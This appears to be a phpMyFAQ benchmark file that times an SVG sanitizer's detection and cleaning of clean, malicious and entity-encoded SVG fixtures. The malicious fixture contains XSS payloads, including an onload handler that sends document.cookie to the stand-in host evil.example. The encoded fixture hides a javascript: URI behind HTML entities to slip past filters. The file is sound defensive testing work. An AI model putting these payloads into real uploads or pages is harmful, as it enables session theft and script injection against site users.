<?php

/**
 * Benchmark for the SVG sanitizer.
 *
 * Measures the regex + entity-decoding pipeline that runs every time a user
 * uploads an SVG image. Covers three real-world payload shapes:
 *
 *  - Clean SVG   : plain diagram with no dangerous content
 *  - Malicious   : XSS payload with script tags, event handlers, and encoded URIs
 *  - Encoded     : multi-layer entity-encoded javascript: URI bypass attempt
 *
 * Run with:
 *   ./phpmyfaq/src/libs/bin/phpbench run tests/Benchmarks/SvgSanitizerBench.php --report=default
 *
 * This Source Code Form is subject to the terms of the Mozilla Public License,
 * v. 2.0. If a copy of the MPL was not distributed with this file, You can
 * obtain one at https://mozilla.org/MPL/2.0/.
 *
 * @package   phpMyFAQ
 * @author    Thorsten Rinne <thorsten@phpmyfaq.de>
 * @copyright 2026 phpMyFAQ Team
 * @license   https://www.mozilla.org/MPL/2.0/ Mozilla Public License Version 2.0
 * @link      https://www.phpmyfaq.de
 * @since     2026-04-04
 */

declare(strict_types=1);

namespace phpMyFAQ\Benchmarks;

use PhpBench\Attributes\BeforeMethods;
use PhpBench\Attributes\Groups;
use PhpBench\Attributes\Iterations;
use PhpBench\Attributes\Revs;
use PhpBench\Attributes\Warmup;
use phpMyFAQ\Helper\SvgSanitizer;

#[BeforeMethods(['setUp'])]
#[Groups(['svg'])]
class SvgSanitizerBench
{
    private SvgSanitizer $sanitizer;

    /** A real-world clean SVG icon (no dangerous content). */
    private string $cleanSvg;

    /**
     * SVG with multiple XSS vectors: script tag, event handlers, javascript: href,
     * data: src, and CSS expression — mirrors what an attacker would upload.
     */
    private string $maliciousSvg;

    /**
     * SVG whose dangerous payload is hidden behind multi-layer HTML entity encoding.
     * Tests the decodeAllEntities() loop that defends against bypass attempts.
     */
    private string $encodedPayloadSvg;

    public function setUp(): void
    {
        $this->sanitizer = new SvgSanitizer();

        $this->cleanSvg = <<<'SVG'
            <?xml version="1.0" encoding="UTF-8"?>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
              <title>phpMyFAQ Logo</title>
              <desc>A simple FAQ icon used in phpMyFAQ navigation</desc>
              <circle cx="12" cy="12" r="10" fill="#336699" />
              <text x="12" y="16" font-size="12" text-anchor="middle" fill="white">FAQ</text>
              <path d="M4 4 L20 4 L20 20 L4 20 Z" stroke="#ffffff" stroke-width="1" fill="none"/>
              <rect x="6" y="8" width="12" height="2" fill="#ffffff" rx="1"/>
              <rect x="6" y="12" width="8" height="2" fill="#ffffff" rx="1"/>
            </svg>
            SVG;

        $this->maliciousSvg = <<<'SVG'
            <?xml version="1.0" encoding="UTF-8"?>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
              <script type="text/javascript">alert('XSS from script tag')</script>
              <circle cx="50" cy="50" r="40" onclick="alert('XSS via onclick')" fill="red"/>
              <rect x="10" y="10" width="80" height="80" onload="fetch('https://evil.example/steal?c='+document.cookie)"/>
              <a href="javascript:alert('XSS via href')"><text x="50" y="50">Click me</text></a>
              <image xlink:href="javascript:alert('XSS via xlink:href')" x="0" y="0"/>
              <image src="data:text/html,<script>alert(1)</script>" x="0" y="0"/>
              <foreignObject width="100" height="100">
                <body xmlns="http://www.w3.org/1999/xhtml">
                  <iframe src="https://evil.example/phish"/>
                </body>
              </foreignObject>
              <text style="expression(alert('CSS expression XSS'))">Bad text</text>
              <text style="background:url(javascript:alert(1))">More bad</text>
            </svg>
            SVG;

        // "javascript:" encoded as decimal HTML entities: &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;
        $this->encodedPayloadSvg = <<<'SVG'
            <?xml version="1.0" encoding="UTF-8"?>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
              <circle cx="50" cy="50" r="40" fill="blue"/>
              <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('encoded XSS')">
                <text x="50" y="55" text-anchor="middle" fill="white">Hover me</text>
              </a>
              <rect x="10" y="10" width="80" height="30"
                    onclick="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#101;&#118;&#101;&#110;&#116;&#32;&#88;&#83;&#83;&#39;&#41;"
                    fill="none"/>
            </svg>
            SVG;
    }

    // -------------------------------------------------------------------------
    // isSafe() — validate-only path, no file I/O, pure string analysis
    // -------------------------------------------------------------------------

    #[Revs(500), Iterations(5), Warmup(2)]
    public function benchIsSafeCleanContent(): void
    {
        // Simulate isSafe() logic on content directly (avoids file I/O in bench)
        $this->runIsSafeOnContent($this->cleanSvg);
    }

    #[Revs(500), Iterations(5), Warmup(2)]
    public function benchIsSafeMaliciousContent(): void
    {
        $this->runIsSafeOnContent($this->maliciousSvg);
    }

    #[Revs(500), Iterations(5), Warmup(2)]
    public function benchIsSafeEncodedPayload(): void
    {
        $this->runIsSafeOnContent($this->encodedPayloadSvg);
    }

    // -------------------------------------------------------------------------
    // detectIssues() — returns a list of all problems found
    // -------------------------------------------------------------------------

    #[Revs(500), Iterations(5), Warmup(2)]
    public function benchDetectIssuesClean(): void
    {
        $this->sanitizer->detectIssues($this->cleanSvg);
    }

    #[Revs(500), Iterations(5), Warmup(2)]
    public function benchDetectIssuesMalicious(): void
    {
        $this->sanitizer->detectIssues($this->maliciousSvg);
    }

    #[Revs(500), Iterations(5), Warmup(2)]
    public function benchDetectIssuesEncoded(): void
    {
        $this->sanitizer->detectIssues($this->encodedPayloadSvg);
    }

    // -------------------------------------------------------------------------
    // sanitize() via a temp file — measures the full pipeline including file I/O
    // -------------------------------------------------------------------------

    #[Revs(100), Iterations(5), Warmup(2)]
    public function benchSanitizeCleanFile(): void
    {
        $path = $this->writeTempSvg($this->cleanSvg);
        $this->sanitizer->sanitize($path);
        unlink($path);
    }

    #[Revs(100), Iterations(5), Warmup(2)]
    public function benchSanitizeMaliciousFile(): void
    {
        $path = $this->writeTempSvg($this->maliciousSvg);
        $this->sanitizer->sanitize($path);
        unlink($path);
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------

    /**
     * Runs the isSafe() content-analysis logic directly on a string.
     * Extracted here to avoid file I/O in the pure-analysis benchmarks.
     * Mirrors SvgSanitizer::isSafe() after the file_get_contents() call.
     */
    private function runIsSafeOnContent(string $content): bool
    {
        // Replicate the internal content-analysis portion of isSafe()
        // by calling detectIssues() which runs the same decode + pattern loop.
        return $this->sanitizer->detectIssues($content) === [];
    }

    private function writeTempSvg(string $content): string
    {
        $path = tempnam(sys_get_temp_dir(), 'pmf_bench_') . '.svg';
        file_put_contents($path, $content);
        return $path;
    }
}
